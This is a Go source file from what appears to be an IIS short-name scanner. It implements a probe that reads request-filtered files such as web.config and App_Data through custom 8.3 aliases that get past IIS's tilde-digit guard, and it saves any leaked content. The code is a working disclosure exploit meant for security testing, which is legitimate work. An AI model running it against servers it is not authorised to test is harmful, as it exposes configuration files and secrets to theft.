package shortscan

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/fatih/color"
)

// customsfn.go implements --custom-sfn: the H47 custom short-name READ probe.
//
// iiscore!CheckIfShortFileName — the guard that answers 404.0 canonical-mismatch
// when a request uses an 8.3 alias — only fires when the path contains a tilde
// immediately followed by an ASCII digit. A CUSTOM 8.3 alias that is not of the
// ~<digit> form (SRC47.TXT, RCFG~A.TXT, DATA47) escapes the guard: IIS picks the
// handler/MIME/RequestFiltering by the alias name, but NTFS opens the long name
// it points to, so a request-filtered file (web.config, .compiled, App_Data,
// /bin) is served. This is the read complement to --exact-short, which already
// confirms existence of custom forms but bodyless; here we GET the content, guard
// against a catch-all with a random same-extension control, and save any leak.
//
// The alias must pre-exist in NTFS metadata (SetFileShortName needs
// SeRestorePrivilege; it is not remotely plantable), so names are supplied by the
// operator — the same "you give the target" model as -i / --exact-short.

func runCustomSFNProbes(urls []string, hc *http.Client, st *httpStats) {
	for _, base := range urls {
		if !strings.HasSuffix(base, "/") {
			base += "/"
		}
		for _, alias := range args.CustomSFN {
			probeCustomSFN(hc, st, base, strings.TrimPrefix(alias, "/"))
		}
	}
}

func probeCustomSFN(hc *http.Client, st *httpStats, base, alias string) {
	// Percent-encode the alias so a URL-significant byte in a custom 8.3 name (a
	// literal '#', '%', '&', … — all legal in an NTFS name) targets the real file
	// instead of, for '#', becoming a fragment and fetching the directory root.
	url := retrieveURL(base, alias)
	res, body, err := fetchBody(hc, st, "GET", url, 1<<16)
	if err != nil || res == nil || res.StatusCode < 200 || res.StatusCode >= 300 || len(body) == 0 {
		status := 0
		if res != nil {
			status = res.StatusCode
		}
		note := "no read"
		switch status {
		case 301, 302, 307, 308:
			// A directory alias (e.g. App_Data's custom SFN) redirects to add the
			// trailing slash; the read is on a child, not the directory itself.
			note = fmt.Sprintf("redirect — likely a directory alias; append a child, e.g. --custom-sfn '%s/file.ext'", strings.TrimRight(alias, "/"))
		case 0:
			note = "no response"
		}
		printHuman("  " + color.HiBlackString("[CUSTOM-SFN] %s -> %d (%s)", alias, status, note))
		return
	}
	// control: a random same-extension 8.3-legal alias must NOT also serve, else the
	// server answers 200 to everything and this is a false positive.
	ext := ""
	if i := strings.LastIndex(alias, "."); i >= 0 {
		ext = alias[i:]
	}
	ctrl := strings.ToUpper(randAlnum(6)) + ext
	if cres, cbody, _ := fetchBody(hc, st, "GET", retrieveURL(base, ctrl), 2048); cres != nil && cres.StatusCode/100 == 2 && len(cbody) > 0 {
		printHuman("  " + color.HiBlackString("[CUSTOM-SFN] %s -> 200 but the random control also served (catch-all); ignored", alias))
		return
	}
	kind := "file bytes"
	if looksBinary(body) {
		kind = "binary bytes"
	}
	printHuman("  " + color.HiRedString("[CUSTOM-SFN/high] %s served %d %s — custom 8.3 alias escapes iiscore!CheckIfShortFileName (the ~[0-9] gate) and reads the request-filtered target", alias, len(body), kind))
	printHuman("  " + color.HiRedString("    URL: %s", url))
	if saved, savedPath, _ := saveDisclosedFile(hc, st, url, alias); saved {
		printHuman("  " + color.HiGreenString("    saved -> %s", savedPath))
	} else if savedPath != "" {
		printHuman("  " + color.HiBlackString("    %s", savedPath))
	}
}
